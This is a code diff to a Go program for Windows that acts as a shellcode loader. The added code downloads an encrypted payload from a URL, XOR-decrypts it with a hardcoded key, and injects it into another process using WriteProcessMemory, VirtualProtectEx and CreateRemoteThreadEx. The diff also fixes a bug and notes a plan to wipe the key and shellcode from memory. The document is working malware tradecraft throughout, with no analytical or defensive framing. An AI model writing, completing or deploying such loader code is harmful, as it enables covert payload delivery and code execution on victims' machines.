@@ -49,12 +49,17 @@ func main() {
 		os.Exit(1)
 	}
 
-	// TO-DO impl xor decrypt
-	// enc, _ := fP(url)
-	// sc, - := xor(sc, k)
-	sc, err := fetchPayload(url)
+	enc, err := fetchPayload(url)
 	if err != nil {
 		fmt.Printf("Error: fetch failure: %v\n", err)
+		os.Exit(1)
+	}
+
+	key := []byte{0x3A, 0x7F, 0x1C, 0x92}
+
+	sc, err := xor(enc, key)
+	if err != nil {
+		fmt.Printf("Error decrypting payload: %v\n", err)
 		os.Exit(1)
 	}
 
@@ -67,7 +72,7 @@ func main() {
 
 	/* Open Process */
 	hProcess, errOpen := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid32)
-	if err != nil {
+	if errOpen != nil {
 		fmt.Printf("Error opening process {%v}: %v\n", pid32, errOpen)
 		os.Exit(1)
 	}
@@ -88,7 +93,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	/* write to buffer using NewProc */
+	/* 1. Write shellcode while memory is still RW */
 	pWriteProcessMemory := kernel32dll.NewProc("WriteProcessMemory")
 	var bytesWritten uintptr
 	rWrite, _, errW := pWriteProcessMemory.Call(
@@ -103,7 +108,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	// PAGE_READWRITE -> PAGE_EXCUTE_READ
+	/* 2. Change protection to RX after writing is complete */
 	pVirtualProtectEx := kernel32dll.NewProc("VirtualProtectEx")
 	var oldProt uint32
 	rProt, _, errP := pVirtualProtectEx.Call(uintptr(hProcess),
@@ -113,12 +118,12 @@ func main() {
 		uintptr(unsafe.Pointer(&oldProt)),
 	)
 	if rProt == 0 {
-		fmt.Printf("VirtualProtect failed: %v", errP)
+		fmt.Printf("VirtualProtect failed: %v\n", errP)
 		os.Exit(1)
 	}
 	fmt.Printf("Memory protection shifted to RX successfully. Old protect: 0x%x\n", oldProt)
 
-	/* creating remote threads */
+	/* 3. Create remote thread */
 	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")
 	var tid uint32
 	hThread, _, errT := pCreateRemoteThreadEx.Call(uintptr(hProcess),
@@ -138,10 +143,11 @@ func main() {
 	fmt.Printf("Successful thread creation TID:[%v]\n", tid)
 	defer windows.CloseHandle(windows.Handle(hThread))
 
-	/* Wait for thread to finish */
-	event, errWait := windows.WaitForSingleObject(windows.Handle(hThread), 5000)
+	event, errWait := windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
 	if errWait != nil {
 		fmt.Printf("Error waiting for thread{%v}: %v\n", tid, errWait)
 	}
 	fmt.Printf("Event Created :%v\n", event)
+
+	// TO_DO Zero out key and shellcode
 }
